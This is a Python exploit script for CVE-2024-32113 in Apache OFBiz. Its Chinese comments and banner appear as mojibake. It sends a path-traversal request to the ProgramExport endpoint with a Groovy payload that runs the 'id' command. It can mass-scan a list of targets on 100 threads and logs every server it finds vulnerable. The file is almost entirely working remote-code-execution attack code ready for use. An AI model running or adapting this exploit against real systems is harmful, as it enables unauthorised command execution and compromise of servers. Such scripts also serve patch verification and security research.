#Apache OFBiz ÁõÆÂΩïÈÅçÂéÜËá¥‰ª£Á†ÅÊâßË°åÊºèÊ¥û
#CVE-2024-32113

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''

 ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ   ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà   ‚ñà‚ñà‚ñà‚ñÑ ‚ñÑ‚ñà‚ñà‚ñà‚ñì ‚ñà‚ñà‚ñà‚ñÑ ‚ñÑ‚ñà‚ñà‚ñà‚ñì ‚ñÑ‚ñÑ‚ñÑ       ‚ñà‚ñà‚ñà‚ñÑ    ‚ñà ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ    ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñÑ  
‚ñí‚ñà‚ñà‚ñÄ ‚ñÄ‚ñà  ‚ñí‚ñà‚ñà‚ñí  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí‚ñÄ‚ñà‚ñÄ ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà‚ñí‚ñÄ‚ñà‚ñÄ ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñÑ     ‚ñà‚ñà ‚ñÄ‚ñà   ‚ñà ‚ñí‚ñà‚ñà‚ñÄ ‚ñà‚ñà‚ñå   ‚ñì‚ñà   ‚ñÄ ‚ñí‚ñí ‚ñà ‚ñà ‚ñí‚ñë‚ñì‚ñà   ‚ñÄ ‚ñí‚ñà‚ñà‚ñÄ ‚ñÄ‚ñà  
‚ñí‚ñì‚ñà    ‚ñÑ ‚ñí‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñì‚ñà‚ñà    ‚ñì‚ñà‚ñà‚ñë‚ñì‚ñà‚ñà    ‚ñì‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà  ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñà‚ñà  ‚ñÄ‚ñà ‚ñà‚ñà‚ñí‚ñë‚ñà‚ñà   ‚ñà‚ñå   ‚ñí‚ñà‚ñà‚ñà   ‚ñë‚ñë  ‚ñà   ‚ñë‚ñí‚ñà‚ñà‚ñà   ‚ñí‚ñì‚ñà    ‚ñÑ 
‚ñí‚ñì‚ñì‚ñÑ ‚ñÑ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà   ‚ñà‚ñà‚ñë‚ñí‚ñà‚ñà    ‚ñí‚ñà‚ñà ‚ñí‚ñà‚ñà    ‚ñí‚ñà‚ñà ‚ñë‚ñà‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà ‚ñì‚ñà‚ñà‚ñí  ‚ñê‚ñå‚ñà‚ñà‚ñí‚ñë‚ñì‚ñà‚ñÑ   ‚ñå   ‚ñí‚ñì‚ñà  ‚ñÑ  ‚ñë ‚ñà ‚ñà ‚ñí ‚ñí‚ñì‚ñà  ‚ñÑ ‚ñí‚ñì‚ñì‚ñÑ ‚ñÑ‚ñà‚ñà‚ñí
‚ñí ‚ñì‚ñà‚ñà‚ñà‚ñÄ ‚ñë‚ñë ‚ñà‚ñà‚ñà‚ñà‚ñì‚ñí‚ñë‚ñí‚ñà‚ñà‚ñí   ‚ñë‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñí   ‚ñë‚ñà‚ñà‚ñí ‚ñì‚ñà   ‚ñì‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñë   ‚ñì‚ñà‚ñà‚ñë‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñì    ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñí‚ñà‚ñà‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí ‚ñì‚ñà‚ñà‚ñà‚ñÄ ‚ñë
‚ñë ‚ñë‚ñí ‚ñí  ‚ñë‚ñë ‚ñí‚ñë‚ñí‚ñë‚ñí‚ñë ‚ñë ‚ñí‚ñë   ‚ñë  ‚ñë‚ñë ‚ñí‚ñë   ‚ñë  ‚ñë ‚ñí‚ñí   ‚ñì‚ñí‚ñà‚ñë‚ñë ‚ñí‚ñë   ‚ñí ‚ñí  ‚ñí‚ñí‚ñì  ‚ñí    ‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñí‚ñí ‚ñë ‚ñë‚ñì ‚ñë‚ñë‚ñë ‚ñí‚ñë ‚ñë‚ñë ‚ñë‚ñí ‚ñí  ‚ñë
  ‚ñë  ‚ñí     ‚ñë ‚ñí ‚ñí‚ñë ‚ñë  ‚ñë      ‚ñë‚ñë  ‚ñë      ‚ñë  ‚ñí   ‚ñí‚ñí ‚ñë‚ñë ‚ñë‚ñë   ‚ñë ‚ñí‚ñë ‚ñë ‚ñí  ‚ñí     ‚ñë ‚ñë  ‚ñë‚ñë‚ñë   ‚ñë‚ñí ‚ñë ‚ñë ‚ñë  ‚ñë  ‚ñë  ‚ñí   
‚ñë        ‚ñë ‚ñë ‚ñë ‚ñí  ‚ñë      ‚ñë   ‚ñë      ‚ñë     ‚ñë   ‚ñí      ‚ñë   ‚ñë ‚ñë  ‚ñë ‚ñë  ‚ñë       ‚ñë    ‚ñë    ‚ñë     ‚ñë   ‚ñë        
‚ñë ‚ñë          ‚ñë ‚ñë         ‚ñë          ‚ñë         ‚ñë  ‚ñë         ‚ñë    ‚ñë          ‚ñë  ‚ñë ‚ñë    ‚ñë     ‚ñë  ‚ñë‚ñë ‚ñë      
‚ñë                                                             ‚ñë                                ‚ñë        
                                                                         version:CVE-2024-32113 1.0
                                                                         Author: Laowüö¶
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="Apache OFBiz ÁõÆÂΩïÈÅçÂéÜËá¥‰ª£Á†ÅÊâßË°åÊºèÊ¥û")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/webtools/control/forgotPassword/%2e/%2e/ProgramExport'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0", 
        "Connection": "close", 
        "Content-Type": "application/x-www-form-urlencoded", 
        "Accept-Encoding": "gzip"
        }
    data = {"groovyProgram": "throw new Exception('id'.execute().text);"}
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        response = requests.post(url=url,headers=headers,data=data,proxies=proxies,verify=False,timeout=5)
        if response.status_code == 200 and 'gid' in response.text and 'uid' in response.text:
            print( f"{GREEN}[+] {url} Â≠òÂú®ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºÅ{RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] ‰∏çÂ≠òÂú®ÊºèÊ¥ûÔºÅÔºÅ")
    except Exception:
        pass

if __name__ == '__main__':
    main()
